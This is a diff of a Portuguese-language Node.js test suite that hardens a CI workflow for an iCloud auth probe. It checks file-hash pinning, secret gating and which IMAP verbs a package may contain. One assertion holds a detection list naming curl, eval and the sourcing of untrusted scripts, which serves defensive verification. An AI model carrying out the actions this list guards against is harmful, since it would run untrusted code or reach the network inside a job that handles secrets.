+  assert.ok(ip > 0 && ip < im && im < ie && iw < ie, "pin antes de montar e de empacotar: " + nomes.join(" | "));
+  assert.ok(nomes.findIndex((n) => n.startsWith("Só na main")) < ip, "a guarda da entrada vem antes");
+  const passo = PV[ip], s = script(passo);
+  assert.ok(!comSecret(passo) && !/secrets\./.test(J.verificar) && !/^    environment:/m.test(J.verificar), "o verificar não tem secrets nem Environment");
+  assert.match(passo, /^        id: pin\s*$/m);
+  assert.match(s, /PIN=experimentos\/icloud-auth-probe-ferramenta\/aprovados\.json/, "o pin vem do checkout da main (a pasta da ferramenta), não do commit da POC");
+  assert.ok(!/poc\/experimentos\/icloud-auth-probe-ferramenta|\$\{?PIN\}?=.*poc/.test(s) && !/inputs\./.test(s), "nenhuma entrada nem a pasta poc escolhe o pin");
+  assert.match(s, /git -C poc ls-tree -r -z --full-tree HEAD/);
+  assert.match(s, /\^100644 blob/, "só arquivos regulares");
+  assert.match(s, /git -C poc cat-file blob "HEAD:\$RAIZ\/\$ARQ" \| sha256sum/, "hash dos objetos do Git, não do checkout");
+  assert.match(s, /\.operacoes\[\$op\]\[\]/, "a operação escolhe os pins aceitos pela tabela");
+  assert.match(s, /echo rac-pin-v1/);
+  assert.match(s, /LC_ALL=C sort/);
+  for (const x of [/\bnode\b/, /\bnpm\b/, /\bbash poc|\.\/poc|source /, /\bcurl\b/, /\beval\b/]) assert.ok(!x.test(s), "o passo do pin não executa nada vindo da POC nem usa rede: " + x);
+  // jobs com secrets só existem DEPOIS do verificar e dependem dele (falha do pin = nenhum deles roda, e a aprovação do Environment nem é pedida)
+  assert.match(J.provisionar, /^    needs: verificar\s*$/m); assert.match(J.executar, /^    needs: provisionar\s*$/m);
+  assert.ok(!/if:\s*(always|failure|cancelled)\(\)/.test(WF), "nenhum job ou passo roda apesar de falha anterior");
+  assert.match(J.provisionar, /PIN_APROVADO: \$\{\{ needs\.verificar\.outputs\.pin \}\}/);
+  assert.match(J.provisionar, /MANIFESTO_APROVADO: \$\{\{ needs\.verificar\.outputs\.manifesto \}\}/);
+});
+
+test("o Node do CI está fixado numa versão exata (nos dois setup-node, com a action fixada por SHA)", () => {
+  const versoes = [...WF.matchAll(/node-version: "([^"]+)"/g)].map((m) => m[1]);
+  assert.equal(versoes.length, 2);
+  for (const v of versoes) assert.match(v, /^\d+\.\d+\.\d+$/, "versão exata do Node, sem intervalo nem apelido");
+  assert.equal(new Set(versoes).size, 1, "a mesma versão nos jobs verificar e provisionar");
+  assert.equal(versoes[0], "24.22.2", "a versão que o runner usou nas execuções reais do workflow (24.22.2, no cache do runner)");
+  const guia = ler("docs/icloud-poc-deploy.md");
+  assert.ok(guia.includes("`" + versoes[0] + "`"), "o guia registra a mesma versão do Node");
+});
+
+test("aprovados.json: formato, associação operação→pin, manifesto recalculado, ordem, lista de arquivos e P2 = P1 + os dois módulos novos", () => {
+  const pin = JSON.parse(ler(ARQ_PIN));
+  assert.deepEqual(Object.keys(pin).sort(), ["formato", "operacoes", "pins"]);
+  assert.equal(pin.formato, "rac-pin-v1");
+  assert.deepEqual(pin.operacoes, OPERACOES_PIN, "p1_imap só o P1, p2_imap só o P2; as operações sem credencial aceitam os dois");
+  const ops = [...WF.matchAll(/^          - (\w+)$/gm)].map((m) => m[1]).filter((o) => /^(validar_oidc|validar_uso_unico|p1_imap|p2_imap)$/.test(o));
+  assert.deepEqual(Object.keys(pin.operacoes).sort(), [...new Set(ops)].sort(), "a tabela cobre exatamente as operações do workflow");
+  assert.deepEqual(Object.keys(pin.pins), ["p1", "p2"]);
+  for (const [n, p] of Object.entries(pin.pins)) {
+    assert.deepEqual(Object.keys(p).sort(), ["arquivos", "commit_referencia", "manifesto_sha256"], n);
+    assert.match(p.commit_referencia, /^[0-9a-f]{40}$/); assert.match(p.manifesto_sha256, /^[0-9a-f]{64}$/);
+    const chaves = Object.keys(p.arquivos);
+    assert.deepEqual(chaves, [...chaves].sort(), n + ": arquivos em ordem bytewise");
+    for (const [k, v] of Object.entries(p.arquivos)) { assert.match(k, /^(src\/[a-z]+\.mjs|wrangler\.jsonc)$/, k); assert.match(v, /^[0-9a-f]{64}$/, k); }
+    assert.ok(chaves.includes("wrangler.jsonc"));
+    assert.equal(manifestoDe(p.arquivos), p.manifesto_sha256, n + ": o manifesto recalculado confere (o hash cobre caminhos e conteúdos)");
+  }
+  const k1 = Object.keys(pin.pins.p1.arquivos), k2 = Object.keys(pin.pins.p2.arquivos);
+  assert.deepEqual(k1.map((x) => x.replace(/^src\//, "").replace(/\.mjs$/, "")).filter((x) => x !== "wrangler.jsonc"), NOMES_P1);
+  assert.deepEqual(k2.filter((x) => !k1.includes(x)), ["src/mensagem.mjs", "src/mime.mjs"]);
+  assert.deepEqual(k1.filter((x) => !k2.includes(x)), []);
+  for (const k of k1.filter((x) => x !== "src/index.mjs" && x !== "src/politica.mjs" && x !== "src/rotas.mjs")) assert.equal(pin.pins.p1.arquivos[k], pin.pins.p2.arquivos[k], k + ": só índice, política e rotas mudam entre P1 e P2");
+  assert.notEqual(pin.pins.p1.manifesto_sha256, pin.pins.p2.manifesto_sha256);
 });
 
 test("EXECUÇÃO — reconstituição: publica só o arquivo cujo sha256 confere; adulteração, hash errado ou vazio são recusados", { skip: semFerramentas }, () => {
@@ -427,13 +618,14 @@ const BUNDLE_BOM = [
   '};',
   '',
 ].join("\n");
-function rodarEmpacotar(bundle, { extraDist } = {}) {
+function rodarEmpacotar(bundle, { extraDist, pin = "p2" } = {}) {
   const ws = tmp(), temp = tmp();
   const fake = path.join(ws, "experimentos/icloud-auth-probe-ferramenta/node_modules/wrangler/bin");
   fs.mkdirSync(fake, { recursive: true });
   fs.writeFileSync(path.join(fake, "wrangler.js"), 'const fs=require("fs"),p=require("path");const o=process.argv[process.argv.indexOf("--outdir")+1];fs.mkdirSync(o,{recursive:true});fs.writeFileSync(p.join(o,"index.js"),fs.readFileSync(process.env.BUNDLE_FALSO));' + (extraDist ? 'fs.writeFileSync(p.join(o,' + JSON.stringify(extraDist) + '),"x");' : ""));
   fs.mkdirSync(path.join(temp, "pacote"), { recursive: true });
   fs.writeFileSync(path.join(temp, "fontes.sha256"), "00  ./README.md\n");
+  if (pin) fs.writeFileSync(path.join(temp, "pin-nome"), pin + "\n");
   const arq = path.join(temp, "bundle-falso.js");
   fs.writeFileSync(arq, bundle);
   const r = spawnSync("bash", ["-e", "-o", "pipefail", "-c", script(achar(PV, "Empacotar"))], { cwd: ws, encoding: "utf8", env: { PATH: process.env.PATH, HOME: temp, RUNNER_TEMP: temp, GITHUB_WORKSPACE: ws, GITHUB_STEP_SUMMARY: path.join(temp, "resumo.md"), GITHUB_OUTPUT: path.join(temp, "saida.txt"), COMMIT: "a".repeat(40), BUNDLE_FALSO: arq } });
@@ -462,6 +654,19 @@ test("EXECUÇÃO — inspeção do pacote: aceita o bundle esperado (sockets, ho
     ["lista de verbos da P2 ausente", BUNDLE_BOM.replace(/var VERBOS_P2 = .*\n/, "")], ["lista de verbos da P1 ausente", BUNDLE_BOM.replace(/var VERBOS_PERMITIDOS = .*\n/, "")],
   ];
   for (const [nome, bundle] of ruins) assert.notEqual(rodarEmpacotar(bundle).status, 0, nome);
+  // a inspeção depende do pin: o pacote P1 não pode ter nada da P2, e o pacote P2 tem de ter as duas listas de verbos
+  const BUNDLE_P1 = BUNDLE_BOM.replace(/var VERBOS_P2 = .*\n/, "").replace(/var itens = .*\n/, "");
+  assert.equal(rodarEmpacotar(BUNDLE_P1, { pin: "p1" }).status, 0, "bundle do pin P1 aceito");
+  for (const [nome, bundle, pin] of [["conteúdo P2 com o pin P1 (lista da P2 presente)", BUNDLE_BOM, "p1"], ["P1 com verbo EXAMINE", BUNDLE_P1 + 'var v = "EXAMINE";\n', "p1"], ["P1 com FETCH", BUNDLE_P1 + 'var v = "FETCH";\n', "p1"],
+    ["P1 com UID", BUNDLE_P1 + 'var v = "UID";\n', "p1"], ["P1 com RFC822", BUNDLE_P1 + 'var v = "RFC822.SIZE";\n', "p1"], ["P1 com leitura sem PEEK", BUNDLE_P1 + 'var v = "BODY[1]";\n', "p1"],
+    ["conteúdo P1 com o pin P2 (falta a lista da P2)", BUNDLE_P1, "p2"], ["pin desconhecido", BUNDLE_BOM, "p3"], ["sem o arquivo do pin", BUNDLE_BOM, null]])
+    assert.notEqual(rodarEmpacotar(bundle, { pin }).status, 0, nome);
+  // tamanho do pacote: o limite de 120000 caracteres em base64 (variável de ambiente do job seguinte, máximo de 131072 bytes por variável) falha ANTES da aprovação
+  const preenchido = (n) => BUNDLE_BOM + "var enchimento = '" + "a".repeat(n) + "';\n";
+  assert.equal(rodarEmpacotar(preenchido(80000)).status, 0, "pacote de ~80 KB (≈107 mil caracteres em base64) cabe");
+  const grande = rodarEmpacotar(preenchido(95000));
+  assert.notEqual(grande.status, 0, "pacote de ~95 KB (≈127 mil caracteres em base64) é recusado no verificar");
+  assert.match(grande.stdout + grande.stderr, /passa do limite de 120000/);
   assert.notEqual(rodarEmpacotar(BUNDLE_BOM, { extraDist: "extra.txt" }).status, 0, "arquivo inesperado no pacote gerado");
   assert.equal(rodarEmpacotar(BUNDLE_BOM, { extraDist: "index.js.map" }).status, 0, "o mapa de fontes continua permitido");
 });
